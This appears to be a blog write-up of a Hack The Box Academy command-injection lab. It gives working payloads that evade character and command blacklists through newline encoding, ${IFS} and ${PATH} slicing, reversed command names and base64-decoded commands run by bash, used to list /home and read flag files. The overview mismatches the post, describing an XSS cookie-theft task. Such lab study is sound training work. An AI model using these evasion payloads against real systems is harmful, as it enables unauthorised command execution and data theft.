---
layout: post
title:  "Hack The Box - Academy - Command Injections"
description: "Master command injection techniques with Hack The Box - Academy - Command Injections. Learn how to exploit vulnerable web applications and improve your penetration testing skills with expert insights from Zwarts Sec."
date:   2024-10-17 20:30
image:  /images/htb/command-injection/logo.png
tags:   [command-injection,cbbh]
categories: [htbacademy]
---

><b>Overview:</b>
<br/><br/>
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).<br/><br/>
Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:<br/><br/>
Apply the skills you learned in this module to achieve the following:<br/><br/>
 1 Identify a user-input field that is vulnerable to an XSS vulnerability.<br/>
 2 Find a working XSS payload that executes JavaScript code on the target's browser.<br/>
 3 Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag
<br/>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/109/section/1031">Command Injection</a><br/>
<a href="https://jacozwarts.github.io/images/htb/command-injection/Command_Injections_Module_Cheat_Sheet.pdf">Command Injection - Cheat Sheet</a><br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space">PayloadsAllTheThings - Command Injection - Bypass without Space</a>

<hr/>

### Bypassing Other Blacklisted Characters - Exercises
#### Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?
A gotcha I ran into was I didn't add a `space` between the `;` and command I'm waas trying to execute e.g.
`Incorrect payload: 127.0.0.1${LS_COLORS:10:1}$(rev<<<'imaohw')` <br/><br/>
`Correct payload with a encoded \n (%0a)`
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'imaohw')
```
![Bypassing other blacklisted characters exercise gotcha](/images/htb/command-injection/bypassing-other-blacklisted-characters-gotcha.png)

#### Final payload:
Initially, I tried the following command but didn't retrieve the user in `/home`: `127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}%0a${PATH:0:1}home`. The issue stemmed from using the encoded newline character (`%0a`) immediately after `{ls,-la}`, which caused the command to execute incorrectly.

`Correct payload:`
```
127.0.0.1${LS_COLORS:10:1}%0a{ls,-la}${IFS}${PATH:0:1}home
```
<hr/>

### Bypassing Blacklisted Commands
#### Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.
```
127.0.0.1${LS_COLORS:10:1}%0a$(rev<<<'tac')${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
<hr/>

### Advanced Command Obfuscation

#### Exercise: Can you test the below command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?
`$(a="WhOaMi";printf %s "${a,,}")`<br/><br/>
First, we tested individual characters to identify which ones were filtered, such as the semicolon (`;`), space, pipe (`|`), ampersand (`&`), etc. In our case, all of these characters were blocked except for the newline character (`%0a`). To proceed, we needed to modify our payload to avoid using these filtered characters. Another solution is to `Base64 encode` the payload to bypass the filtering<br/><br/>

**Updated command without Base64 encoding:**
```
127.0.0.1%0a$(a="WhOaMi"%0aprintf${IFS}%s${IFS}"${a,,}")
```
**Updated command with Base64 encoding:**
```
127.0.0.1%0abash<<<$(base64%09-d<<<JChhPSJXaE9hTWkiO3ByaW50ZiAlcyAiJHthLCx9Iik=)
```

#### Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
**Execute the below command to base64 encode the payload:**
```
echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
```

```
127.0.0.1127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```
<hr/>

## Skills Assessment
><b>Overview:</b>
You are contracted to perform a penetration test for a company, and through your pentest, you stumble upon an interesting file manager web application. As file managers tend to execute system commands, you are interested in testing for command injection vulnerabilities.
<br/><br/>
Use the various techniques presented in this module to detect a command injection vulnerability and then exploit it, evading any filters in place.

### What is the content of '/flag.txt'?
1. Try to click and analyze the every option and param you see.

2. Fuzz to find out which char are allowed and which are not allowed and on which param is it. (I FUZZ on all each and every param)

3. After finding the ALLOWED CHAR you might want to start injecting your command which will get "Malicious request denied!" (you're on a right track).

4. Try to escape the character from the methods you've learned from this module (focus more on "Bypassing Blacklisted Commands").

5. And now you can read the flag.

There's more than one method to get the flag.
<hr/>